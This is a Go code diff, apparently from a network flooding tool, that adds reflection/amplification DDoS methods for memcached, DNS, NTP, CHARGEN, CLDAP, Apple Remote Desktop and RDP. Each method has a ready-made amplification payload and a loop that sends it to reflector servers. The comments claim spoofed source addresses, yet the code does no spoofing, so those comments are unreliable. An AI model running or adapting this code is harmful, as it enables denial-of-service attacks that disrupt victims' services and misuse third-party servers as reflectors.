@@ -74,6 +74,20 @@ func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Count
 		executeMCBOT(cfg, requestsSent, bytesSent)
 	case "ICMP":
 		executeICMP(cfg, requestsSent, bytesSent)
+	case "MEM":
+		executeMEM(cfg, requestsSent, bytesSent)
+	case "DNS":
+		executeDNS(cfg, requestsSent, bytesSent)
+	case "NTP":
+		executeNTP(cfg, requestsSent, bytesSent)
+	case "CHAR":
+		executeCHAR(cfg, requestsSent, bytesSent)
+	case "CLDAP":
+		executeCLDAP(cfg, requestsSent, bytesSent)
+	case "ARD":
+		executeARD(cfg, requestsSent, bytesSent)
+	case "RDP":
+		executeRDP(cfg, requestsSent, bytesSent)
 	default:
 		executeTCP(cfg, requestsSent, bytesSent)
 	}
@@ -530,5 +544,231 @@ func executeICMP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 		}
 		requestsSent.Add(1)
 		bytesSent.Add(int64(n))
+	}
+}
+
+// Amplification attack methods
+func executeMEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// Memcached amplification attack
+	// Sends UDP packets to reflectors with spoofed source IP
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n")
+	port := 11211
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeDNS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// DNS amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00")
+	port := 53
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeNTP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// NTP amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x17\x00\x03\x2a\x00\x00\x00\x00")
+	port := 123
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeCHAR(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// Character Generator (CHARGEN) amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x01")
+	port := 19
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeCLDAP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// CLDAP (Connectionless LDAP) amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00")
+	port := 389
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeARD(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// Apple Remote Desktop (ARD) amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x00\x14\x00\x00")
+	port := 3283
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
+	}
+}
+
+func executeRDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// RDP (Remote Desktop Protocol) amplification attack
+	if len(cfg.Reflectors) == 0 {
+		return
+	}
+
+	payload := []byte("\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00")
+	port := 3389
+
+	for _, reflector := range cfg.Reflectors {
+		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", reflector, port))
+		if err != nil {
+			continue
+		}
+
+		conn, err := net.DialUDP("udp", nil, addr)
+		if err != nil {
+			continue
+		}
+
+		for i := 0; i < utils.RandInt(2, 5); i++ {
+			n, err := conn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		conn.Close()
 	}
 }
